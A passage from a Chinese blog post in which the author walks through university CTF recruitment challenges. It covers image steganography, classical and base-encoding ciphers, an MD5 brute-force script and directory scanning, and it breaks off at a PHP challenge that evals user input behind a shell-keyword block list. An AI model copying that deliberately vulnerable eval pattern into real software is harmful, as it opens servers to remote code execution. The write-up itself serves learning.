@@ -1,0 +1,241 @@
+<!doctype html><html lang=zh-CN dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="记第一次接触CTF，以及参加招新的解题过程。"><title>某高校CTF招新题MD——初试CTF</title><link rel=canonical href=https://blog.wuko.top/posts/2024/10/30/newbiectf.html/><link rel=stylesheet href=/scss/style.min.833d6eed45de56f48306bf57268d5b8cdfc8a60e8e7bdc99810464fcd033f7c6.css><meta property='og:title' content="某高校CTF招新题MD——初试CTF"><meta property='og:description' content="记第一次接触CTF，以及参加招新的解题过程。"><meta property='og:url' content='https://blog.wuko.top/posts/2024/10/30/newbiectf.html/'><meta property='og:site_name' content="wuko's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:published_time' content='2024-10-30T00:00:00+00:00'><meta property='article:modified_time' content='2024-10-30T00:00:00+00:00'><meta property='og:image' content='https://blog.wuko.top/posts/2024/10/30/newbiectf.html/cover.jpg'><meta name=twitter:title content="某高校CTF招新题MD——初试CTF"><meta name=twitter:description content="记第一次接触CTF，以及参加招新的解题过程。"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://blog.wuko.top/posts/2024/10/30/newbiectf.html/cover.jpg'><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_af0a7c4a31bebdf7.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>💭</span></figure><div class=site-meta><h1 class=site-name><a href=/>wuko's blog</a></h1><h2 class=site-description>从零开始，由心而发。欢迎共同交流学习！</h2></div></header><ol class=menu-social><li><a href=https://github.com/wuko233 target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com/@Arair237 target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/pages/about.html/><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-vocabulary"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 19H4a1 1 0 01-1-1V4a1 1 0 011-1h6a2 2 0 012 2 2 2 0 012-2h6a1 1 0 011 1v14a1 1 0 01-1 1h-6a2 2 0 00-2 2 2 2 0 00-2-2z"/><path d="M12 5v16"/><path d="M7 7h1"/><path d="M7 11h1"/><path d="M16 7h1"/><path d="M16 11h1"/><path d="M16 15h1"/></svg>
+<span>About</span></a></li><li><a href=/pages/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/pages/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/pages/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li><a href=/pages/money/><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-tip-jar"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M14 10h-2.5a1.5 1.5.0 000 3h1a1.5 1.5.0 010 3H10"/><path d="M12 9v1"/><path d="M12 16v1"/><path d="M17 4v1.882c0 .685.387 1.312 1 1.618s1 .933 1 1.618V18a3 3 0 01-3 3H8a3 3 0 01-3-3V9.118c0-.685.387-1.312 1-1.618s1-.933 1-1.618V4"/><path d="M6 4h12z"/></svg>
+<span>Donate</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>暗色模式</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#前言>前言</a></li><li><a href=#misc>misc</a><ol><li><a href=#misc1>misc1</a></li><li><a href=#misc2>misc2</a></li><li><a href=#misc3>misc3</a></li><li><a href=#misc4>misc4</a></li></ol></li><li><a href=#crypto>crypto</a><ol><li><a href=#crypto1>crypto1</a></li><li><a href=#crypto2>crypto2</a></li><li><a href=#crypto3>crypto3</a></li><li><a href=#crypto4>crypto4</a></li><li><a href=#crypto5>crypto5</a></li></ol></li><li><a href=#web>web</a><ol><li><a href=#web1>web1</a></li><li><a href=#web2>web2</a></li><li><a href=#web3>web3</a></li><li><a href=#web4>web4</a></li><li><a href=#web5>web5</a></li><li><a href=#web6>web6</a></li></ol></li><li><a href=#reverse>reverse</a><ol><li><a href=#reverse1>reverse1</a></li><li><a href=#reverse2>reverse2</a></li></ol></li><li><a href=#结尾>结尾</a></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/posts/2024/10/30/newbiectf.html/><img src=/posts/2024/10/30/newbiectf.html/cover_hu_2621f30af882f467.jpg srcset="/posts/2024/10/30/newbiectf.html/cover_hu_2621f30af882f467.jpg 800w, /posts/2024/10/30/newbiectf.html/cover_hu_2c2fdd717517ba48.jpg 1600w" width=800 height=595 loading=lazy alt="Featured image of post 某高校CTF招新题MD——初试CTF"></a></div><div class=article-details><header class=article-category><a href=/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/ style=background-color:#2a9d8f;color:#fff>网络安全</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/posts/2024/10/30/newbiectf.html/>某高校CTF招新题MD——初试CTF</a></h2><h3 class=article-subtitle>记第一次接触CTF，以及参加招新的解题过程。</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2024-10-30T00:00:00Z>Oct 30, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>阅读时长: 8 分钟</time></div></footer></div></header><section class=article-content><h2 id=前言>前言</h2><p>上个月参加了某高校网络安全社团的招新题，记录一下部分题的解题过程。</p><blockquote><p><mark><strong>很多题非原创，无法标明出处还请谅解</strong></mark></p></blockquote><h2 id=misc>misc</h2><h3 id=misc1>misc1</h3><p><img src=/posts/2024/10/30/newbiectf.html/misc1.png width=240 height=240 srcset="/posts/2024/10/30/newbiectf.html/misc1_hu_c19fbe6a0565cd44.png 480w, /posts/2024/10/30/newbiectf.html/misc1_hu_98fd4d3a3d4f3e9b.png 1024w" loading=lazy alt=misc1 class=gallery-image data-flex-grow=100 data-flex-basis=240px></p><blockquote><p>提示：flag在图片数据中</p></blockquote><p>嗯，根据提示，使用<code>WinHEX</code>打开图片查看16进制元数据，发现flag：</p><p><img src=/posts/2024/10/30/newbiectf.html/misc1_1.png width=1885 height=361 srcset="/posts/2024/10/30/newbiectf.html/misc1_1_hu_818026769b0f894d.png 480w, /posts/2024/10/30/newbiectf.html/misc1_1_hu_b3866bf41d1d0969.png 1024w" loading=lazy alt=misc1_1 class=gallery-image data-flex-grow=522 data-flex-basis=1253px></p><p><code>geek{unbelievable}</code></p><h3 id=misc2>misc2</h3><p><img src=/posts/2024/10/30/newbiectf.html/misc2.png width=1860 height=1798 srcset="/posts/2024/10/30/newbiectf.html/misc2_hu_7eb11cc7e62b7bf.png 480w, /posts/2024/10/30/newbiectf.html/misc2_hu_249f48cbc2533154.png 1024w" loading=lazy alt=misc2 class=gallery-image data-flex-grow=103 data-flex-basis=248px></p><blockquote><p>提示：这不只是个图片</p></blockquote><p><code>WinHEX</code>查看16进制，发现里面有zip的头尾：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ZIP
+</span></span><span class=line><span class=cl>50 4B 03 04
+</span></span><span class=line><span class=cl>50 4B 05 06
+</span></span></code></pre></td></tr></table></div></div><p><code>binwalk</code>提取出压缩包，解压得到第二张图片，扫码得到flag：</p><p><img src=/posts/2024/10/30/newbiectf.html/misc2_2.png width=1706 height=1279 srcset="/posts/2024/10/30/newbiectf.html/misc2_2_hu_a4221a4002acfcb9.png 480w, /posts/2024/10/30/newbiectf.html/misc2_2_hu_87b95a5858c2f592.png 1024w" loading=lazy alt=misc2_2 class=gallery-image data-flex-grow=133 data-flex-basis=320px></p><p><code>geek{Amazing}</code></p><h3 id=misc3>misc3</h3><p><img src=/posts/2024/10/30/newbiectf.html/misc3_1.png width=1611 height=937 srcset="/posts/2024/10/30/newbiectf.html/misc3_1_hu_d3cb225eb04e25a7.png 480w, /posts/2024/10/30/newbiectf.html/misc3_1_hu_db383c00d40084.png 1024w" loading=lazy alt=misc3_1 class=gallery-image data-flex-grow=171 data-flex-basis=412px></p><blockquote><p>提示：为啥图片不全呢？</p></blockquote><p>根据提示，对图片进行长宽高修复，得到：</p><p><img src=/posts/2024/10/30/newbiectf.html/misc3-fixed.png width=1706 height=1279 srcset="/posts/2024/10/30/newbiectf.html/misc3-fixed_hu_f6b03bb436f13e6a.png 480w, /posts/2024/10/30/newbiectf.html/misc3-fixed_hu_da0aede085d9ce70.png 1024w" loading=lazy alt=misc3-fixed class=gallery-image data-flex-grow=133 data-flex-basis=320px></p><p><code>geek{HAPPY}</code></p><h3 id=misc4>misc4</h3><p><img src=/posts/2024/10/30/newbiectf.html/misc4.jpg width=1080 height=1080 srcset="/posts/2024/10/30/newbiectf.html/misc4_hu_9696d68329623729.jpg 480w, /posts/2024/10/30/newbiectf.html/misc4_hu_928eca9e5005c9a.jpg 1024w" loading=lazy alt=misc4 class=gallery-image data-flex-grow=100 data-flex-basis=240px></p><p>16位编辑器查看，末尾发现有misc4.mp3字样，以及zip的头尾</p><p><img src=/posts/2024/10/30/newbiectf.html/misc4_1.png width=1095 height=549 srcset="/posts/2024/10/30/newbiectf.html/misc4_1_hu_ce1c809a9e1dea2e.png 480w, /posts/2024/10/30/newbiectf.html/misc4_1_hu_aac329e184fd03a8.png 1024w" loading=lazy alt=misc4_4 class=gallery-image data-flex-grow=199 data-flex-basis=478px></p><p>使用<code>foremost</code>分离，得到带密码的压缩包&mdash;<code>APCHPR</code>爆破出zip文件密码：2024</p><p>解压得到<code>misc4.mp3</code>，一耳听出莫斯码，得出flag：</p><p><code>geek{MORSEISGOOD}</code></p><h2 id=crypto>crypto</h2><h3 id=crypto1>crypto1</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>密文：Z2Vla3tDb21lIG9uIX0=
+</span></span><span class=line><span class=cl>提示：Base Base ~~
+</span></span></code></pre></td></tr></table></div></div><p><code>base64</code>解密得出flag:</p><p><code>geek{Come on!}</code></p><h3 id=crypto2>crypto2</h3><p><img src=/posts/2024/10/30/newbiectf.html/crypto2.png width=1280 height=960 srcset="/posts/2024/10/30/newbiectf.html/crypto2_hu_b8191c666e96a9d7.png 480w, /posts/2024/10/30/newbiectf.html/crypto2_hu_a1e8afbdaa70cfd7.png 1024w" loading=lazy alt=crypto2 class=gallery-image data-flex-grow=133 data-flex-basis=320px></p><p>猪圈密码解密得到：</p><p><code>geek{welcometogeek}</code></p><h3 id=crypto3>crypto3</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>题目：
+</span></span><span class=line><span class=cl>在一个阳光明媚的早晨，小兔子跳跳正在森林里玩耍。它一边跳跃，一边享受着清新的空气和美丽的景色。忽然，它在一棵大树下发现了一个奇怪的盒子，盒子的外观很古老，上面刻着复杂的花纹。
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>好奇的小兔子决定打开这个盒子。经过一番努力，盒子终于打开了，里面是一封信和一个看似重要的古老符号。信上写着：“这是一个通往秘密世界的钥匙，但你需要找到正确的密码才能进入。”
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>小兔子心里充满了探险的热情，开始寻找这个密码。它想到了朋友们，决定去问问聪明的小狐狸和勇敢的小熊。
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>小狐狸听了小兔子的故事，建议道：“或许这个密码就藏在我们平时的生活中。我们可以想象一下，什么事情对我们来说是最重要的。”
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>小熊则说：“我觉得应该是我们友情的象征，或者我们一起度过的快乐时光。”
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>小兔子灵机一动，突然想到了一个词：“冒险！”它相信这个词是打开新世界的钥匙。于是，它带着小狐狸和小熊再次回到那个神秘的盒子前，大声喊出了那个词。
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>然而，盒子却没有反应。小兔子感到有些失望，但它没有放弃，决定再观察一下那个古老的符号。它注意到符号中有一些像是数字和字母的组合。经过一番分析，小兔子想到了一个线索：“如果我们把这些符号想象成一种密码，那会不会是字母和数字的结合？”
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>经过一番讨论和尝试，它们最终拼出了一个神秘的字符串。小兔子觉得这个字符串有种特别的感觉，可能就是那个通往秘密世界的关键。
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>小兔子再次勇敢地对着盒子大声说出这个字符串。随着最后一个字母的发出，盒子发出了一声“咔嚓”声，缓缓打开了。里面闪烁着五彩斑斓的光芒，不同的奇幻生物纷纷出现，它们带来了无数的新奇和冒险。
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>小兔子、小狐狸和小熊兴奋地跳了起来，决定一起探索这个全新的世界。他们知道，只要团结在一起，任何谜题都能被解开，未来的冒险一定会更加精彩！
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>至于那条密文“U2FsdGVkX1/saBrBFn5W/3kLIuGaSpo1BS+F4PyHJSNglsQ=”，它仿佛是这个神秘世界的另一把钥匙，等待着他们去解锁更多未知的宝藏和故事。冒险才刚刚开始！
+</span></span></code></pre></td></tr></table></div></div><p>这道题一开始以为是base混合加密，因为一开始前半部分base64解码出了Salted_完整字符，尝试了好久都没解出来。之后看官方WP，才知道原来是<code>rabbit密码</code>；</p><p><code>geek{you are great}</code></p><h3 id=crypto4>crypto4</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>小张把女儿出生日期的哈希值写在纸上，结果不小心将外卖洒在了上面，只能看到后10位是2b74d3e7a1，你能猜到他女儿的生日吗？哦!他女儿属兔哦。（提示：flag为密码的哈希值）
+</span></span></code></pre></td></tr></table></div></div><p>通过python程序暴力列举得到生日20231028</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>itertools</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hmac</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#https://blog.csdn.net/mails2008/article/details/140398473</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=s2>&#34;2b74d3e7a1&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>characters</span> <span class=o>=</span> <span class=s2>&#34;1234567890&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>dir_list</span> <span class=o>=</span> <span class=n>itertools</span><span class=o>.</span><span class=n>product</span><span class=p>(</span><span class=n>characters</span><span class=p>,</span> <span class=n>repeat</span><span class=o>=</span><span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>dir_list</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>res</span><span class=p>[</span><span class=o>-</span><span class=mi>10</span><span class=p>:]</span> <span class=o>==</span> <span class=n>key</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;birthday;&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>res</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#output:</span>
+</span></span><span class=line><span class=cl><span class=c1>#birthday;(&#39;2&#39;, &#39;0&#39;, &#39;2&#39;, &#39;3&#39;, &#39;1&#39;, &#39;0&#39;, &#39;2&#39;, &#39;8&#39;)</span>
+</span></span><span class=line><span class=cl><span class=c1>#2473ff35a9ae66a24b8995&lt;mark&gt;2b74d3e7a1&lt;/mark&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p><img src=/posts/2024/10/30/newbiectf.html/crypto-output.png width=1280 height=1517 srcset="/posts/2024/10/30/newbiectf.html/crypto-output_hu_b6d09f1f07c5e5f6.png 480w, /posts/2024/10/30/newbiectf.html/crypto-output_hu_5eafbc69e94b810.png 1024w" loading=lazy alt=crypto4-output class=gallery-image data-flex-grow=84 data-flex-basis=202px></p><blockquote><p>参考了 <a class=link href=https://blog.csdn.net/mails2008/article/details/140398473 target=_blank rel=noopener>csdn</a> 做了一些修改、</p></blockquote><h3 id=crypto5>crypto5</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>题目：三个小姐两个爹JM2VMRKVKYZUGSJVINMFKWSDJBEEMVSWJVGUGMSHIZBUMTKRKNEEWWSMI5DU2Q2YJZFEQRSBKZCEYTCFLJDEWVSCKFEEMSKGJFGUENI=
+</span></span><span class=line><span class=cl>提示1：大老爷有一个女儿，二老爷有两个女儿
+</span></span><span class=line><span class=cl>提示2：老爷留了12个金条，剩下16条都给了小姐
+</span></span></code></pre></td></tr></table></div></div><p>提取所有数字得到key<code>1221216</code>,base26-32-64-91混合解码得到<code>Z2Vla3todWFuPFUW4Z3ONF6Q====</code>,base64解码得到一半是乱码&mldr;得到了<code>geek{huan</code></p><p>后来查看官方WP，原来是两部分。。。：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Z2Vla3todWFu
+</span></span><span class=line><span class=cl>PFUW4Z3ONF6Q====
+</span></span></code></pre></td></tr></table></div></div><p>将第一个用base64解码得到geek{huan，第二个用base32解码得yingni}拼接后得到flag是<code>geek{huanyingni}</code></p><blockquote><p>只有大写字母和数字，像base32加密</p></blockquote><p>学到了。。。</p><h2 id=web>web</h2><h3 id=web1>web1</h3><p>注释找到<code>ZmxhZ+WcqC93ZWIvd2ViM59mbGFnL2ZsYWcudHh0</code></p><p>base64解码得到</p><p><code>flag在http://ip/web/web1/flag/flag.txt</code></p><p><img src=/posts/2024/10/30/newbiectf.html/web1.png width=803 height=358 srcset="/posts/2024/10/30/newbiectf.html/web1_hu_b38bec5b25930a7d.png 480w, /posts/2024/10/30/newbiectf.html/web1_hu_f332af0bf6b06609.png 1024w" loading=lazy alt=web1 class=gallery-image data-flex-grow=224 data-flex-basis=538px></p><p>访问得到<code>geek{crazy}</code></p><h3 id=web2>web2</h3><p>注释base64解码得到<code>你会用dirsearch吗？</code></p><p><code>dirsearch</code>扫描网站目录</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>python.exe ./dirsearch.py -u http://ip/web/web2/
+</span></span></code></pre></td></tr></table></div></div><p>得到http://ip/web/web2/flag.php，访问得到flag:<code>geek{Excellent}</code></p><h3 id=web3>web3</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl> <span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;c&#39;</span><span class=p>])){</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$c</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;c&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|\:|</span><span class=se>\&#34;</span><span class=s2>/i&#34;</span><span class=p>,</span> <span class=nv>$c</span><span class=p>)){</span>
+</span></span><span class=line><span class=cl>        <span class=k>eval</span><span class=p>(</span><span class=nv>$c</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl><span class=p>}</span><span class=k>else</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
